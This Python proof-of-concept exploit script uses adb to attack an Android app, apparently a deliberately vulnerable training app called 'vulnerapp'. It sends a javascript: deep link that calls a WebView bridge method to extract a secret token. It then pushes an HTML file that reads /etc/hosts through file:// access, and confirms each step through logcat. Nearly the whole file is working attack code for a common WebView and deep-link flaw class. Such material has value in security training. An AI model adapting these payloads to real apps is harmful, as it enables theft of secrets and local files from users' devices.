```python
import subprocess
import threading
import time
import urllib.parse
import os
import sys

# --- Logcat Monitor Class ---
class LogcatMonitor:
    def __init__(self):
        self.logs = []
        self._stop_event = threading.Event()
        self._thread = None
        self.process = None

    def _run(self):
        # Clear logcat first
        subprocess.run(['adb', 'logcat', '-c'], capture_output=True, text=True, check=False)
        
        cmd = ['adb', 'logcat']
        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1, universal_newlines=True)
        
        for line in iter(self.process.stdout.readline, ''):
            if self._stop_event.is_set():
                break
            self.logs.append(line.strip())
        
        # Ensure the process is terminated when the thread stops
        if self.process.poll() is None:
            self.process.terminate()
            self.process.wait()

    def start(self):
        print("[*] Starting logcat monitor...")
        self._stop_event.clear()
        self.logs = []
        self._thread = threading.Thread(target=self._run)
        self._thread.daemon = True # Allow main program to exit even if thread is running
        self._thread.start()

    def stop(self):
        if self._thread and self._thread.is_alive():
            print("[*] Stopping logcat monitor...")
            self._stop_event.set()
            # Give it a moment to terminate gracefully, then force if necessary
            self._thread.join(timeout=2)
            if self.process and self.process.poll() is None:
                self.process.kill()
                self.process.wait()
            self.process = None
            print("[*] Logcat monitor stopped.")

    def get_logs(self):
        return list(self.logs)

# --- ADB Helper Functions ---
def run_adb_command(command, check_output=False, shell=False):
    if shell:
        cmd = ['adb', 'shell'] + command
    else:
        cmd = ['adb'] + command
    
    try:
        if check_output:
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            return result.stdout.strip()
        else:
            subprocess.run(cmd, check=True, capture_output=True, text=True) # capture_output to prevent output to console
            return True
    except subprocess.CalledProcessError as e:
        print(f"[-] ADB command failed: {' '.join(cmd)}")
        print(f"[-] Stdout: {e.stdout}")
        print(f"[-] Stderr: {e.stderr}")
        return False
    except FileNotFoundError:
        print("[-] 'adb' command not found. Please ensure Android SDK Platform-Tools are installed and in your PATH.")
        sys.exit(1)

def wait_for_device():
    print("[*] Waiting for ADB device...")
    try:
        subprocess.run(['adb', 'wait-for-device'], check=True, capture_output=True, text=True)
        print("[+] Device connected.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to connect to device: {e.stderr}")
        sys.exit(1)
    except FileNotFoundError:
        print("[-] 'adb' command not found. Please ensure Android SDK Platform-Tools are installed and in your PATH.")
        sys.exit(1)

# --- Main PoC Logic ---
def main():
    wait_for_device()

    package_name = "com.dlh.vulnerapp"
    activity_name = "com.dlh.vulnerapp.WebViewActivity"
    deep_link_scheme = "dlh"
    deep_link_host = "webview"

    print(f"[+] Targeting {package_name}/{activity_name}")

    # Start logcat monitoring
    logcat_monitor = LogcatMonitor() 
    logcat_monitor.start()
    time.sleep(1) # Give logcat a moment to fully start

    # --- PoC 1: XSS - Extract AndroidBridge.getSecrets() ---
    print("\n--- PoC 1: XSS - Extracting secret via AndroidBridge.getSecrets() ---")
    
    # Payload to call AndroidBridge.getSecrets() and display it in a Toast
    xss_payload = "javascript:AndroidBridge.showToast('PoC1-Secret: ' + AndroidBridge.getSecrets());"
    
    # Construct the deep link URI
    deep_link_uri_xss = f"{deep_link_scheme}://{deep_link_host}?url={urllib.parse.quote(xss_payload)}"
    
    # ADB command to launch the deep link
    adb_command_xss = [
        "am", "start", "-n", f"{package_name}/{activity_name}",
        "-a", "android.intent.action.VIEW",
        "-d", deep_link_uri_xss
    ]
    
    print(f"[*] Launching XSS payload: {' '.join(adb_command_xss)}")
    if run_adb_command(adb_command_xss, shell=True):
        time.sleep(3) # Give the activity and WebView time to load and execute JS

        # Verify XSS success by checking logcat for the expected secret
        xss_success_indicator = "PoC1-Secret: SUPER_SECRET_TOKEN_FROM_BRIDGE"
        logs = logcat_monitor.get_logs()
        if any(xss_success_indicator in log for log in logs):
            print(f"[+] PoC 1 SUCCESS: Found '{xss_success_indicator}' in logcat. Secret exfiltrated!")
        else:
            print(f"[-] PoC 1 FAILED: Could not find '{xss_success_indicator}' in logcat.")
            print("--- Last 20 lines of logcat for debugging ---")
            for log_line in logs[-20:]:
                print(log_line)
            print("---------------------------------------------")
    else:
        print("[-] PoC 1 FAILED: ADB command to launch XSS payload failed.")

    # --- PoC 2: LFI - Read /etc/hosts via injected JS from a pushed HTML file ---
    print("\n--- PoC 2: LFI - Reading /etc/hosts via injected JavaScript ---")

    local_exploit_html_filename = "lfi_exploit.html"
    device_exploit_path = f"/sdcard/{local_exploit_html_filename}"

    # Create the local HTML exploit file
    html_content = f"""
    <html><body>
    <script>
        // Use try-catch for better error reporting in Toast
        try {{
            fetch('file:///etc/hosts')
                .then(response => {{
                    if (!response.ok) {{
                        throw new Error('HTTP error ' + response.status + ' when fetching file');
                    }}
                    return response.text();
                }})
                .then(data => AndroidBridge.showToast('PoC2-LFI Success: First 100 chars of /etc/hosts: ' + data.substring(0, 100)))
                .catch(err => AndroidBridge.showToast('PoC2-LFI Failed to read file: ' + err.message));
        }} catch (e) {{
            AndroidBridge.showToast('PoC2-LFI Error during fetch setup: ' + e.message);
        }}
    </script>
    </body></html>
    """
    
    try:
        with open(local_exploit_html_filename, "w") as f:
            f.write(html_content)
        print(f"[*] Created local exploit HTML: {local_exploit_html_filename}")

        # Push the HTML file to the device
        print(f"[*] Pushing {local_exploit_html_filename} to {device_exploit_path}...")
        if not run_adb_command(['push', local_exploit_html_filename, device_exploit_path]):
            print("[-] Failed to push exploit file. Skipping PoC 2.")
            return
        print("[+] Exploit file pushed successfully.")

        # Deep link to the local HTML file on the device
        deep_link_uri_lfi = f"{deep_link_scheme}://{deep_link_host}?url={urllib.parse.quote('file://' + device_exploit_path)}"
        
        adb_command_lfi = [
            "am", "start", "-n", f"{package_name}/{activity_name}",
            "-a", "android.intent.action.VIEW",
            "-d", deep_link_uri_lfi
        ]

        print(f"[*] Launching LFI payload: {' '.join(adb_command_lfi)}")
        if run_adb_command(adb_command_lfi, shell=True):
            time.sleep(3) # Give the activity and WebView time to load and execute JS

            # Verify LFI success
            lfi_success_indicator = "PoC2-LFI Success: First 100 chars of /etc/hosts:"
            logs = logcat_monitor.get_logs()
            if any(lfi_success_indicator in log for log in logs):
                print(f"[+] PoC 2 SUCCESS: Found '{lfi_success_indicator}' in logcat. Local file content exfiltrated!")
            else:
                print(f"[-] PoC 2 FAILED: Could not find '{lfi_success_indicator}' in logcat.")
                print("--- Last 20 lines of logcat for debugging ---")
                for log_line in logs[-20:]:
                    print(log_line)
                print("---------------------------------------------")
        else:
            print("[-] PoC 2 FAILED: ADB command to launch LFI payload failed.")

    finally:
        # Clean up: remove exploit file from device and local machine
        print("\n[*] Cleaning up...")
        if os.path.exists(local_exploit_html_filename):
            os.remove(local_exploit_html_filename)
            print(f"[+] Removed local file: {local_exploit_html_filename}")
        
        print(f"[*] Removing {device_exploit_path} from device...")
        run_adb_command(['rm', device_exploit_path], shell=True) # No need to check output for cleanup
        print(f"[+] Removed device file: {device_exploit_path}")

        logcat_monitor.stop()

if __name__ == "__main__":
    main()
```